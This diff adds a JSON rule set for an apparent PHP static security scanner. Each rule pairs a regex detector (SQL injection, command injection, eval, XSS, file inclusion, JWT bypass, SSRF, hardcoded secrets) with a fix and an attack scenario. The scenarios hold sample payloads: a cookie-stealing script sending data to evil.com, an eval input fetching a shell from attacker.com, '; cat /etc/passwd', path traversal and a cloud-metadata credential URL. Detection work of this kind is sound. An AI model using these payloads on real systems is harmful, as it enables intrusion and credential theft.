@@ -1,0 +1,521 @@
+{
+  "schema_version": 1,
+  "rules": [
+    {
+      "id": "PHP-INJ-001",
+      "name": "SQL Injection – string concatenation in query",
+      "severity": "CRITICAL",
+      "category": "Injection (OWASP A03)",
+      "pattern": "(?:mysqli_query|mysql_query|pg_query|mssql_query)\\s*\\([^)]*(?:\\$_GET|\\$_POST|\\$_REQUEST|\\$_COOKIE)[^)]*\\)",
+      "flags": "g",
+      "file_types": [
+        "php"
+      ],
+      "why": "User input from $_GET/$_POST is concatenated directly into the SQL query without sanitisation.",
+      "scenario": "An attacker enters ' OR '1'='1 in a form field and gains access to the entire database or can delete tables.",
+      "fix": "Use PDO with prepared statements: $stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $stmt->execute([$id]);"
+    },
+    {
+      "id": "PHP-INJ-002",
+      "variant": "concat",
+      "name": "SQL Injection – direct variable interpolation",
+      "severity": "CRITICAL",
+      "category": "Injection (OWASP A03)",
+      "pattern": "\\$(?:SQL|sql|query|qry|str)\\s*(?:\\.?=)\\s*(?:[^;\\n]{0,120}[\\\".\\s]|[\\\"'])\\s*\\.\\s*\\$(?:_GET|_POST|_REQUEST|_COOKIE|_SESSION)\\s*\\[|\\$(?:SQL|sql|query|qry)\\s*\\.=\\s*\\$(?:_GET|_POST|_REQUEST|_COOKIE|_SESSION)\\s*\\[",
+      "flags": "g",
+      "antipattern": "sqlsrv_query|mysqli_query|pg_query|\\$(?:stmt|pdo|db|conn)->(?:prepare|execute|query)|^\\s*(?:\\/\\/|#|\\*)",
+      "antipattern_flags": "i",
+      "lookahead": 200,
+      "file_types": [
+        "php"
+      ],
+      "why": "PHP variables from superglobals (incl. $_SESSION) are concatenated directly into the SQL string without sanitisation.",
+      "scenario": "An attacker sends id=1+OR+1=1 as a GET parameter. The SQL string becomes \"WHERE id=1 OR 1=1\" and returns all rows.",
+      "fix": "Use parameterised queries: $stmt = sqlsrv_query($link, \"SELECT ... WHERE id=?\", array($_POST[\"id\"]));"
+    },
+    {
+      "id": "PHP-INJ-002",
+      "variant": "interpolation",
+      "name": "SQL Injection – variable interpolation in SQL string",
+      "severity": "CRITICAL",
+      "category": "Injection (OWASP A03)",
+      "pattern": "[\\\"]\\s*(?:SELECT|INSERT|UPDATE|DELETE|WHERE)[^\\n\\\"]{0,150}\\$(?:_GET|_POST|_REQUEST|_COOKIE|_SESSION)\\s*\\[[^\\]]+\\][^\\n\\\"]{0,50}[\\\"]",
+      "flags": "gi",
+      "antipattern": "sqlsrv_query|mysqli_query|\\$(?:stmt|pdo)->(?:prepare|execute)|^\\s*(?:\\/\\/|#|\\*)",
+      "antipattern_flags": "i",
+      "lookahead": 200,
+      "file_types": [
+        "php"
+      ],
+      "why": "PHP variables are interpolated directly into the SQL string via double quotes.",
+      "scenario": "An attacker sends name=\" OR 1=1-- and the SQL query returns all records in the table.",
+      "fix": "Never use variables directly in SQL strings. Use prepared statements with ? as placeholders."
+    },
+    {
+      "id": "PHP-INJ-002",
+      "variant": "taint-concat",
+      "name": "SQL Injection – tainted variable concatenated into query",
+      "severity": "CRITICAL",
+      "category": "Injection (OWASP A03)",
+      "taint_aware": true,
+      "pattern": "\\$(?:SQL|sql|query|qry|str)\\s*(?:\\.?=)\\s*[\\\"'][^\\n\\\"']{0,200}(?:WHERE|FROM|INTO|SET|VALUES)[^\\n\\\"']{0,100}[\\\"']\\s*\\.\\s*\\$(?!_GET|_POST|_REQUEST|_COOKIE|_SESSION|stmt|pdo|conn|db)[a-zA-Z_]\\w{0,30}\\s*[;,\\\"')/]",
+      "flags": "g",
+      "antipattern": "sqlsrv_query|mysqli_query|pg_query|\\$(?:stmt|pdo|db|conn)->(?:prepare|execute|query)|^\\s*(?:\\/\\/|#|\\*)",
+      "antipattern_flags": "i",
+      "lookbehind": 400,
+      "lookahead": 50,
+      "file_types": [
+        "php"
+      ],
+      "why": "A superglobal ($_GET/$_POST) is assigned to a local variable which is then concatenated into SQL without sanitisation.",
+      "scenario": "Developer assigns $id = $_GET[\"id\"] then uses $query = \"SELECT ... WHERE id = \" . $id — still vulnerable to injection.",
+      "fix": "Use parameterised queries: $stmt = $pdo->prepare(\"SELECT * FROM t WHERE id = ?\"); $stmt->execute([$_GET[\"id\"]]);"
+    },
+    {
+      "id": "PHP-INJ-002",
+      "variant": "taint-interpolation",
+      "name": "SQL Injection – tainted variable interpolated in SQL string",
+      "severity": "CRITICAL",
+      "category": "Injection (OWASP A03)",
+      "taint_aware": true,
+      "taint_extract": "interpolation",
+      "pattern": "\\\"[^\\n\\\"]{0,300}\\$(?!_GET|_POST|_REQUEST|_COOKIE|_SESSION|stmt|pdo|conn|db)[a-zA-Z_]\\w*[^\\n\\\"]{0,100}\\\"",
+      "flags": "gi",
+      "antipattern": "sqlsrv_query|mysqli_query|\\$(?:stmt|pdo)->(?:prepare|execute)|^\\s*(?:\\/\\/|#|\\*)",
+      "antipattern_flags": "i",
+      "lookahead": 50,
+      "file_types": [
+        "php"
+      ],
+      "why": "A variable assigned from user input ($_GET/$_POST) is interpolated directly into a SQL string.",
+      "scenario": "Developer assigns $username = $_POST[\"username\"] then interpolates it in SQL — attacker can inject arbitrary SQL.",
+      "fix": "Use parameterised queries. Never interpolate variables into SQL strings."
+    },
+    {
+      "id": "PHP-INJ-003",
+      "name": "Remote Code Execution – eval with user input",
+      "severity": "CRITICAL",
+      "category": "Injection (OWASP A03)",
+      "pattern": "eval\\s*\\(\\s*(?:\\$_GET|\\$_POST|\\$_REQUEST|\\$_COOKIE|base64_decode\\s*\\(\\s*\\$)",
+      "flags": "g",
+      "file_types": [
+        "php"
+      ],
+      "why": "eval() executes arbitrary PHP code. With user input as the data source, RCE is inevitable.",
+      "scenario": "Attacker sends PHP code as parameter: ?code=system(\"wget attacker.com/shell.php\"). The server executes it.",
+      "fix": "Never use eval() with external input. Replace with whitelisted operations or a proper template engine."
+    },
+    {
+      "id": "PHP-INJ-004",
+      "variant": "direct",
+      "name": "Command Injection – shell_exec / system with user input",
+      "severity": "CRITICAL",
+      "category": "Injection (OWASP A03)",
+      "pattern": "(?:shell_exec|system|exec|passthru|popen)\\s*\\(\\s*(?:[^)]*\\$(?:_GET|_POST|_REQUEST|_COOKIE)|[^)]*\\.\\s*\\$(?:_GET|_POST|_REQUEST))",
+      "flags": "g",
+      "file_types": [
+        "php"
+      ],
+      "why": "Shell commands are built with direct user input and executed on the server.",
+      "scenario": "Attacker sends \"; cat /etc/passwd\" as a filename parameter. The server returns the password file.",
+      "fix": "Use escapeshellarg() for all input and avoid shell functions entirely where possible."
+    },
+    {
+      "id": "PHP-INJ-004",
+      "variant": "taint",
+      "name": "Command Injection – tainted variable in shell command",
+      "severity": "CRITICAL",
+      "category": "Injection (OWASP A03)",
+      "taint_aware": true,
+      "taint_extract": "func_concat",
+      "pattern": "(?:shell_exec|system|exec|passthru|popen)\\s*\\([^)]*\\.\\s*\\$(?!_GET|_POST|_REQUEST|_COOKIE|_SESSION|stmt|pdo|conn|db)[a-zA-Z_]\\w*\\s*[;)]",
+      "flags": "g",
+      "file_types": [
+        "php"
+      ],
+      "why": "A variable assigned from user input is concatenated into a shell command without sanitisation.",
+      "scenario": "Developer assigns $file = $_GET[\"filename\"] then uses system(\"unzip \" . $file) — attacker can inject shell commands.",
+      "fix": "Use escapeshellarg($file) and validate input against a whitelist before using in shell commands."
+    },
+    {
+      "id": "PHP-INJ-005",
+      "name": "XSS – unsanitised output of user input",
+      "severity": "HIGH",
+      "category": "Injection (OWASP A03)",
+      "pattern": "echo\\s+(?:\\$_GET|\\$_POST|\\$_REQUEST|\\$_COOKIE)\\s*\\[",
+      "flags": "g",
+      "file_types": [
+        "php"
+      ],
+      "why": "User input is written directly to HTML output without escaping.",
+      "scenario": "An attacker injects <script>document.location=\"https://evil.com?c=\"+document.cookie</script> via a parameter and steals cookies from visitors.",
+      "fix": "Always use htmlspecialchars(): echo htmlspecialchars($_GET[\"name\"], ENT_QUOTES, \"UTF-8\")"
+    },
+    {
+      "id": "PHP-ERR-001",
+      "name": "Information Disclosure – SQL query exposed on error",
+      "severity": "HIGH",
+      "category": "Security Misconfiguration (OWASP A05)",
+      "pattern": "(?:or\\s*die|or\\s*exit|\\|\\|\\s*die|\\|\\|\\s*exit)\\s*\\(\\s*\\$(?:SQL|sql|query|qry)|die\\s*\\(\\s*\\$(?:SQL|sql|query|qry)|die\\s*\\([^)]*(?:mysql_error|sqlsrv_errors|pg_last_error|mssql_get_last_message)\\s*\\(\\s*\\)\\s*\\)",
+      "flags": "gi",
+      "file_types": [
+        "php"
+      ],
+      "why": "The error handler prints the full SQL query or raw database error message directly in the HTTP response. An attacker receives table names, column names and SQL structure.",
+      "scenario": "An attacker deliberately triggers a syntax error. The response contains: \"You have an error in your SQL syntax near SELECT usr, password FROM users WHERE\" — the database schema is now known.",
+      "fix": "Log the error server-side and show a generic message: error_log(print_r(sqlsrv_errors(), true)); http_response_code(500); die(\"An internal error occurred.\");"
+    },
+    {
+      "id": "PHP-CMT-001",
+      "name": "Commented-out insecure code – SQL injection pattern in comment",
+      "severity": "MEDIUM",
+      "category": "Security Misconfiguration (OWASP A05)",
+      "pattern": "^\\s*(?:\\/\\/|#|\\/\\*|\\*)[^\\n]{0,200}\\$(?:SQL|sql|query|qry)[^\\n]{0,150}\\$(?:_GET|_POST|_REQUEST|_COOKIE|_SESSION)\\s*\\[",
+      "flags": "gm",
+      "file_types": [
+        "php"
+      ],
+      "why": "Commented-out code with an SQL injection pattern remains in the codebase. The code is inactive but can be re-enabled by a developer unaware of the security risk.",
+      "scenario": "A developer finds the commented-out code during debugging and removes the comment to \"quickly test something\". The code is now active and vulnerable.",
+      "fix": "Remove the commented-out code entirely. If the functionality is needed, implement it with prepared statements from the start."
+    },
+    {
+      "id": "PHP-AUTH-001",
+      "name": "Password comparison with == instead of password_verify",
+      "severity": "CRITICAL",
+      "category": "Identification and Authentication Failures (OWASP A07)",
+      "pattern": "(?:\\$_POST|\\$_GET|\\$_REQUEST)\\s*\\[['\\\"](?:password|passwd|pwd)['\\\"]]\\s*==\\s*\\$\\w+",
+      "flags": "gi",
+      "file_types": [
+        "php"
+      ],
+      "why": "Loose comparisons (==) are vulnerable to type juggling attacks in PHP. password_verify() must always be used.",
+      "scenario": "PHP's == converts types: '0e123' == '0e456' is true because both are interpreted as 0 in scientific notation. An attacker can log in with a different password.",
+      "fix": "Use password_verify($input, $hash) and password_hash($password, PASSWORD_BCRYPT) for storage."
+    },
+    {
+      "id": "PHP-AUTH-002",
+      "variant": "direct",
+      "name": "File inclusion with user input (LFI/RFI)",
+      "severity": "CRITICAL",
+      "category": "Broken Access Control (OWASP A01)",
+      "pattern": "(?:include|require|include_once|require_once)\\s*(?:\\(?)\\s*(?:\\$_GET|\\$_POST|\\$_REQUEST|\\$_COOKIE)\\s*\\[",
+      "flags": "g",
+      "file_types": [
+        "php"
+      ],
+      "why": "Filenames from user input are used in include/require — enabling Local/Remote File Inclusion.",
+      "scenario": "An attacker sends ?page=../../../../etc/passwd and the server reads and returns system files.",
+      "fix": "Never use user input directly in include. Whitelist allowed pages: $allowed = [\"home\", \"about\"]; if(in_array($page, $allowed)) include $page . \".php\";"
+    },
+    {
+      "id": "PHP-AUTH-002",
+      "variant": "taint",
+      "name": "File inclusion – tainted variable in include/require (LFI)",
+      "severity": "CRITICAL",
+      "category": "Broken Access Control (OWASP A01)",
+      "taint_aware": true,
+      "taint_extract": "func_concat",
+      "pattern": "(?:include|require|include_once|require_once)\\s*\\(?\\s*\\$(?!_GET|_POST|_REQUEST|_COOKIE|_SESSION)([a-zA-Z_]\\w*)\\s*[.;)]",
+      "flags": "g",
+      "file_types": [
+        "php"
+      ],
+      "why": "A variable assigned from user input is used in include/require — enabling Local File Inclusion.",
+      "scenario": "Developer assigns $page = $_GET[\"page\"] then calls include($page . \".php\") — attacker can include sensitive files.",
+      "fix": "Whitelist allowed values: $allowed = [\"home\", \"about\"]; if (in_array($page, $allowed)) include $page . \".php\";"
+    },
+    {
+      "id": "PHP-AUTH-003",
+      "name": "IDOR – database lookup without ownership check",
+      "severity": "HIGH",
+      "category": "Broken Access Control (OWASP A01)",
+      "pattern": "WHERE\\s+id\\s*=\\s*(?:\\$_GET|\\$_POST|\\$_REQUEST)\\s*\\[",
+      "flags": "gi",
+      "antipattern": "AND\\s+(?:user_id|owner_id|created_by)",
+      "antipattern_flags": "i",
+      "lookahead": 150,
+      "file_types": [
+        "php"
+      ],
+      "why": "Database objects are fetched directly with an ID from the URL without checking whether the user owns the record.",
+      "scenario": "A user with ID 5 changes the URL from ?id=5 to ?id=3 and views another user's data.",
+      "fix": "Always add an ownership check: WHERE id = ? AND user_id = ? using the logged-in user's ID."
+    },
+    {
+      "id": "PHP-AUTH-004",
+      "name": "IDOR – owner ID taken from $_POST without session verification",
+      "severity": "HIGH",
+      "category": "Broken Access Control (OWASP A01)",
+      "pattern": "\\$(?:pid|uid|user_id|owner_id|userId|ownerId|projectId|projekt_id)\\s*=\\s*(?:[^;\\n]{0,200})?\\$_POST\\s*\\[",
+      "flags": "gi",
+      "antipattern": "\\$(?:pid|uid|user_id|owner_id|userId|ownerId|projectId|projekt_id)\\s*=\\s*\\$_SESSION\\s*\\[",
+      "antipattern_flags": "i",
+      "lookahead": 150,
+      "file_types": [
+        "php"
+      ],
+      "why": "Owner ID (uid/pid) can be sourced from POST data controlled by the client. An attacker can send arbitrary IDs and operate on other users' data.",
+      "scenario": "A mobile client sends userID=7&projectID=3. The server uses these values directly as owner IDs without verifying against the logged-in session.",
+      "fix": "Always verify against $_SESSION: retrieve $_SESSION[\"user_id\"] server-side and compare with or replace the POST-supplied ID."
+    },
+    {
+      "id": "PHP-AUTH-005",
+      "name": "Password stored in plaintext in database",
+      "severity": "CRITICAL",
+      "category": "Identification and Authentication Failures (OWASP A07)",
+      "pattern": "\\$(?:SQL|sql|query)\\s*(?:\\.?=)[^;\\n]{0,200}(?:password|passwd|pwd)\\s*[='\\\",.][^;\\n]{0,100}\\$(?:_GET|_POST|_REQUEST)\\s*\\[['\\\"]s*(?:password|passwd|pwd)",
+      "flags": "gi",
+      "antipattern": "password_hash|bcrypt|argon2|crypt\\s*\\(",
+      "antipattern_flags": "i",
+      "lookahead": 300,
+      "file_types": [
+        "php"
+      ],
+      "why": "The password from the form is stored directly in the database without hashing. In the event of a database breach all users' passwords are exposed in plaintext.",
+      "scenario": "An attacker with SELECT access to the database dumps the entire user table and obtains all passwords in plaintext.",
+      "fix": "Always hash passwords with password_hash() before storage: $hash = password_hash($_POST[\"password\"], PASSWORD_BCRYPT); Then verify with password_verify($input, $hash)."
+    },
+    {
+      "id": "PHP-AUTH-006",
+      "name": "Sensitive operations via $_GET (password/user data in URL)",
+      "severity": "HIGH",
+      "category": "Identification and Authentication Failures (OWASP A07)",
+      "pattern": "\\$_GET\\s*\\[\\s*['\\\"]s*(?:password|passwd|pwd|new_password|secret|token)\\s*['\\\"]\\s*\\]",
+      "flags": "gi",
+      "file_types": [
+        "php"
+      ],
+      "why": "Passwords and sensitive values in GET parameters end up in server logs, browser history, proxy logs and Referer headers.",
+      "scenario": "WS_addUser.php?usr=admin&password=secret123 appears in the Apache log, browser history, and is sent with the Referer header to external resources.",
+      "fix": "Always use POST for passwords and sensitive operations. Never send passwords as URL parameters."
+    },
+    {
+      "id": "PHP-CRYPTO-001",
+      "name": "Weak password hashing algorithm (MD5/SHA1)",
+      "severity": "HIGH",
+      "category": "Cryptographic Failures (OWASP A02)",
+      "pattern": "(?:md5|sha1)\\s*\\(\\s*(?:\\$_POST|\\$_GET|\\$password|\\$passwd|\\$pwd)",
+      "flags": "gi",
+      "file_types": [
+        "php"
+      ],
+      "why": "MD5 and SHA1 are cryptographically broken and unsuitable for password hashing.",
+      "scenario": "An attacker with database access can crack MD5-hashed passwords using rainbow tables in seconds.",
+      "fix": "Use password_hash($password, PASSWORD_BCRYPT) and password_verify($input, $hash)."
+    },
+    {
+      "id": "PHP-CRYPTO-002",
+      "name": "Hardcoded database password in configuration",
+      "severity": "HIGH",
+      "category": "Security Misconfiguration (OWASP A05)",
+      "pattern": "(?:DB_PASSWORD|db_password|mysql_password|MYSQL_PWD)\\s*=\\s*['\\\"][^'\\\"]{4,}['\\\"]",
+      "flags": "gi",
+      "antipattern": "(?:getenv|env\\(|\\$_ENV)",
+      "lookahead": 20,
+      "file_types": [
+        "php"
+      ],
+      "why": "The database password is hardcoded in the source code and exposed in version control.",
+      "scenario": "Anyone with repository access — including former employees — now has access to the production database.",
+      "fix": "Use an environment variable: define('DB_PASSWORD', getenv('DB_PASSWORD')); and store in .env outside git."
+    },
+    {
+      "id": "PHP-JWT-001",
+      "name": "JWT decoded without signature verification",
+      "severity": "CRITICAL",
+      "category": "Broken Authentication (OWASP A07)",
+      "pattern": "JWT\\s*::\\s*decode\\s*\\([^)]{0,200}(?:null\\s*,|,\\s*null\\s*,|\\[\\s*\\]|\\bfalse\\b)",
+      "flags": "gi",
+      "file_types": [
+        "php"
+      ],
+      "why": "Calling JWT::decode() with a null key or empty key array skips signature verification. Any token with a valid structure is accepted regardless of who signed it.",
+      "scenario": "AI passes null as the key argument to JWT::decode() during prototyping. The code ships. Attacker forges a token with [\"role\" => \"admin\", \"user_id\" => 1] and gains admin access.",
+      "fix": "Always provide the key: JWT::decode($token, new Key($secretKey, \"HS256\")). Use firebase/php-jwt >= 6.0 which requires an explicit Key object."
+    },
+    {
+      "id": "PHP-JWT-002",
+      "name": "JWT algorithm \"none\" accepted — signature bypass",
+      "severity": "CRITICAL",
+      "category": "Broken Authentication (OWASP A07)",
+      "pattern": "(?:JWT|jwt|token|auth)[^;]{0,200}\\[\\s*['\\\"]none['\\\"]\\s*\\]|allowedAlgorithms[^;]{0,100}none",
+      "flags": "gi",
+      "file_types": [
+        "php"
+      ],
+      "why": "Accepting \"none\" as a valid algorithm means tokens without signatures are trusted.",
+      "scenario": "Allowed algorithms array includes \"none\". Attacker takes a valid token, strips the signature, changes alg to \"none\" in the header, and modifies the payload. Server accepts it.",
+      "fix": "Use an explicit allowlist: [\"HS256\"] or [\"RS256\"]. Never include \"none\"."
+    },
+    {
+      "id": "PHP-JWT-003",
+      "name": "JWT payload read by manual base64 decode — signature not verified",
+      "severity": "HIGH",
+      "category": "Broken Authentication (OWASP A07)",
+      "pattern": "explode\\s*\\(\\s*['\\\"][.]?['\\\"]\\s*[^)]*\\$\\w*[Tt]oken[\\s\\S]{0,200}base64_decode|base64_decode[\\s\\S]{0,200}explode\\s*\\(\\s*['\\\"][.]['\\\"][^)]*\\$\\w*[Tt]oken",
+      "flags": "gi",
+      "file_types": [
+        "php"
+      ],
+      "why": "Splitting a JWT on \".\" and base64-decoding the payload reads the claims without verifying the HMAC signature. The payload is just base64url-encoded JSON — completely attacker-controlled.",
+      "scenario": "Code does $parts = explode(\".\", $token); $payload = json_decode(base64_decode($parts[1])). Attacker creates a token with \"admin\": true in the payload. No signature check — any payload is trusted.",
+      "fix": "Use a JWT library for all token operations. Never manually decode JWT parts."
+    },
+    {
+      "id": "PHP-SECRET-001",
+      "name": "Hardcoded API key or secret in source code",
+      "severity": "CRITICAL",
+      "category": "Security Misconfiguration (OWASP A05)",
+      "pattern": "(?:api[_-]?key|api[_-]?secret|app[_-]?secret|client[_-]?secret|access[_-]?token|auth[_-]?token|private[_-]?key)\\s*=\\s*['\\\"][a-zA-Z0-9\\-_\\/+]{16,}['\\\"]",
+      "flags": "gi",
+      "antipattern": "getenv|env\\(|\\$_ENV|\\$_SERVER|\\.env|\\btest\\b|\\bmock\\b|\\bexample\\b",
+      "antipattern_flags": "i",
+      "lookahead": 60,
+      "file_types": [
+        "php"
+      ],
+      "why": "Hardcoded secrets are exposed to everyone with repository access. Automated scanners harvest API keys from public repos within minutes of a push.",
+      "scenario": "$api_key = \"sk-prod-abc123xyz...\" committed to git. Repo becomes public. Within hours, the key is used to rack up charges on a third-party API or access customer data.",
+      "fix": "$api_key = getenv(\"API_KEY\"); Store in .env (git-ignored) with vlucas/phpdotenv locally, and as environment variables in production hosting."
+    },
+    {
+      "id": "PHP-SECRET-002",
+      "name": "Hardcoded JWT secret or HMAC key",
+      "severity": "CRITICAL",
+      "category": "Security Misconfiguration (OWASP A05)",
+      "pattern": "(?:JWT\\s*::\\s*encode\\s*\\(\\s*[^,]+,\\s*['\\\"]w[^'\\\"]{7,}['\\\"]|hash_hmac\\s*\\(\\s*[^,]+,\\s*[^,]+,\\s*['\\\"]w[^'\\\"]{7,}['\\\"])\\s*[,)]",
+      "flags": "gi",
+      "antipattern": "getenv|env\\(|\\$_ENV",
+      "antipattern_flags": "i",
+      "lookahead": 40,
+      "file_types": [
+        "php"
+      ],
+      "why": "A hardcoded JWT signing key means tokens can be forged by anyone with source code access.",
+      "scenario": "JWT::encode($payload, \"supersecret\") in source. Attacker reads key from repo, forges tokens for any user ID or role.",
+      "fix": "$secret = getenv(\"JWT_SECRET\"); JWT::encode($payload, $secret, \"HS256\"). Generate with: php -r \"echo bin2hex(random_bytes(64));\""
+    },
+    {
+      "id": "PHP-REDIRECT-001",
+      "name": "Open redirect — unvalidated request parameter used in header redirect",
+      "severity": "HIGH",
+      "category": "Security Misconfiguration (OWASP A05)",
+      "pattern": "header\\s*\\(\\s*['\\\"]Location\\s*:[^'\\\"]*['\\\"],\\s*\\.\\s*\\$_(?:GET|POST|REQUEST|COOKIE)|header\\s*\\(\\s*\\\"Location:\\s*\\$_(?:GET|POST|REQUEST)",
+      "flags": "gi",
+      "file_types": [
+        "php"
+      ],
+      "why": "Concatenating user input into a Location header gives attackers full control over the redirect destination, enabling phishing attacks under your domain.",
+      "scenario": "header(\"Location: \" . $_GET[\"next\"]) after login. Attacker sends users to yoursite.com/login?next=https://evil.com. After authenticating, users land on the phishing page.",
+      "fix": "$next = $_GET[\"next\"] ?? \"/\"; $parsed = parse_url($next); if (!empty($parsed[\"host\"])) $next = \"/\"; header(\"Location: \" . $next);"
+    },
+    {
+      "id": "PHP-PATH-001",
+      "name": "Path traversal — user input used in file_get_contents or include",
+      "severity": "CRITICAL",
+      "category": "Broken Access Control (OWASP A01)",
+      "pattern": "(?:file_get_contents|file_put_contents|readfile|include|require|include_once|require_once|fopen)\\s*\\(\\s*(?:\\$_(?:GET|POST|REQUEST|COOKIE)|[^;]{0,60}\\$_(?:GET|POST|REQUEST))",
+      "flags": "gi",
+      "file_types": [
+        "php"
+      ],
+      "why": "Passing user-supplied input to file functions or include statements allows reading arbitrary files (LFI) or in some configurations executing remote code (RFI).",
+      "scenario": "include($_GET[\"page\"] . \".php\"). Attacker requests ?page=../../../../etc/passwd or ?page=http://evil.com/shell (RFI if allow_url_include is on).",
+      "fix": "$allowed = [\"home\", \"about\", \"contact\"]; $page = $_GET[\"page\"] ?? \"home\"; if (!in_array($page, $allowed)) $page = \"home\"; include(\"pages/\" . $page . \".php\");"
+    },
+    {
+      "id": "PHP-SSRF-001",
+      "name": "SSRF — user-controlled URL passed to curl or file_get_contents",
+      "severity": "HIGH",
+      "category": "Server-Side Request Forgery (OWASP A10)",
+      "pattern": "(?:curl_setopt\\s*\\([^,]+,\\s*CURLOPT_URL\\s*,\\s*\\$_(?:GET|POST|REQUEST)|file_get_contents\\s*\\(\\s*\\$_(?:GET|POST|REQUEST)\\s*\\[)",
+      "flags": "gi",
+      "file_types": [
+        "php"
+      ],
+      "why": "SSRF via curl or file_get_contents allows attackers to make the PHP server send requests to internal services — including cloud metadata endpoints, internal APIs, Redis, and other infrastructure.",
+      "scenario": "curl_setopt($ch, CURLOPT_URL, $_GET[\"url\"]) to proxy images. Attacker sends ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/. Server returns AWS credentials.",
+      "fix": "$url = $_GET[\"url\"]; $parsed = parse_url($url); $allowed = [\"cdn.example.com\", \"api.example.com\"]; if (!in_array($parsed[\"host\"], $allowed)) die(\"Forbidden\");"
+    },
+    {
+      "id": "PHP-AUTH-007",
+      "name": "Authentication based on unvalidated $_COOKIE value",
+      "severity": "HIGH",
+      "category": "Broken Authentication (OWASP A07)",
+      "pattern": "\\$_COOKIE\\s*\\[['\\\"][^'\\\"]{2,}['\\\"]\\]\\s*(?:==|===|!=|!==)\\s*['\\\"](?:admin|root|superuser|true|1|yes)|if\\s*\\([^)]{0,100}\\$_COOKIE\\s*\\[['\\\"](?:role|admin|is_admin|user_type|access|level|auth)['\\\"]",
+      "flags": "gi",
+      "file_types": [
+        "php"
+      ],
+      "why": "Cookie values are completely attacker-controlled — any user can set any cookie to any value using browser dev tools. Using $_COOKIE directly for authorization decisions gives attackers trivial privilege escalation.",
+      "scenario": "if ($_COOKIE[\"role\"] === \"admin\") — attacker opens DevTools, sets cookie role=admin, reloads. Full admin access without any credentials.",
+      "fix": "Never trust cookie values directly for authorization. Store the role in the server-side session: $_SESSION[\"role\"] = \"admin\" after verified authentication."
+    },
+    {
+      "id": "PHP-EXPOSURE-001",
+      "name": "PHP error display enabled — errors exposed to browser",
+      "severity": "EXPOSURE",
+      "category": "Security Misconfiguration (OWASP A05)",
+      "pattern": "ini_set\\s*\\(\\s*['\\\"]display_errors['\\\"]\\s*,\\s*['\\\"]?1['\\\"]?\\s*\\)|ini_set\\s*\\(\\s*['\\\"]display_errors['\\\"]\\s*,\\s*true\\s*\\)",
+      "flags": "gi",
+      "file_types": [
+        "php"
+      ],
+      "why": "display_errors=1 sends PHP error messages, warnings, and notices directly to the browser response. These messages expose file paths, variable values, SQL queries, and application structure.",
+      "scenario": "ini_set(\"display_errors\", 1) left in from development. A malformed request triggers a database error exposing the full file path and database name.",
+      "fix": "In production: ini_set(\"display_errors\", 0); error_reporting(E_ALL); ini_set(\"log_errors\", 1); ini_set(\"error_log\", \"/var/log/php/errors.log\"); Log everything, display nothing."
+    },
+    {
+      "id": "PHP-EXPOSURE-002",
+      "name": "Laravel APP_DEBUG=true — debug mode in application config",
+      "severity": "EXPOSURE",
+      "category": "Security Misconfiguration (OWASP A05)",
+      "pattern": "['\\\"]debug['\\\"]\\s*=>\\s*true|APP_DEBUG\\s*=\\s*true",
+      "flags": "gi",
+      "antipattern": "env\\s*\\(\\s*['\\\"]APP_DEBUG['\\\"]",
+      "antipattern_flags": "i",
+      "lookahead": 40,
+      "file_types": [
+        "php"
+      ],
+      "why": "Laravel's debug mode exposes the Ignition error page which shows full stack traces, environment variables, request data, and config values on every unhandled exception.",
+      "scenario": "APP_DEBUG=true deployed to production. User triggers a 500 error. Ignition page reveals: DB_PASSWORD, APP_KEY, full stack trace with internal paths — fully visible to the user.",
+      "fix": "In config/app.php: \"debug\" => env(\"APP_DEBUG\", false). Ensure .env in production has APP_DEBUG=false."
+    },
+    {
+      "id": "PHP-EXPOSURE-003",
+      "name": "Laravel APP_KEY hardcoded or missing — encryption key in source",
+      "severity": "EXPOSURE",
+      "category": "Security Misconfiguration (OWASP A05)",
+      "pattern": "['\\\"]key['\\\"]\\s*=>\\s*['\\\"]base64:[A-Za-z0-9+\\/=]{20,}['\\\"]",
+      "flags": "g",
+      "antipattern": "env\\s*\\(\\s*['\\\"]APP_KEY['\\\"]",
+      "antipattern_flags": "i",
+      "lookahead": 40,
+      "file_types": [
+        "php"
+      ],
+      "why": "Laravel APP_KEY is used to encrypt cookies, sessions, queued jobs, and all data passed through Laravel's Crypt facade. A hardcoded or leaked key allows attackers to decrypt all encrypted application data.",
+      "scenario": "APP_KEY hardcoded in config/app.php, committed to git. Attacker decrypts all user session cookies and forges remember_me tokens for any user ID.",
+      "fix": "\"key\" => env(\"APP_KEY\") — this is the Laravel default. Generate: php artisan key:generate. Store only in .env (git-ignored) and production environment variables."
+    },
+    {
+      "id": "PHP-EXPOSURE-004",
+      "name": "WordPress database credentials or secret keys hardcoded in wp-config",
+      "severity": "EXPOSURE",
+      "category": "Security Misconfiguration (OWASP A05)",
+      "pattern": "define\\s*\\(\\s*['\\\"](?:DB_PASSWORD|DB_USER|AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|NONCE_KEY|AUTH_SALT)['\\\"]\\s*,\\s*['\\\"][^'\\\"]{8,}['\\\"]\\s*\\)",
+      "flags": "gi",
+      "antipattern": "getenv|putenv|\\$_ENV|\\$_SERVER",
+      "antipattern_flags": "i",
+      "lookahead": 40,
+      "file_types": [
+        "php"
+      ],
+      "why": "WordPress stores database credentials and cryptographic salts directly in wp-config.php. If this file is accidentally exposed, all credentials and session signing keys are compromised.",
+      "scenario": "wp-config.php committed to a public GitHub repo. Attacker extracts DB_PASSWORD, connects directly to MySQL, dumps all user password hashes and personal data.",
+      "fix": "Load from environment: define(\"DB_PASSWORD\", getenv(\"DB_PASSWORD\")). Store actual values outside the webroot and outside version control."
+    }
+  ]
+}
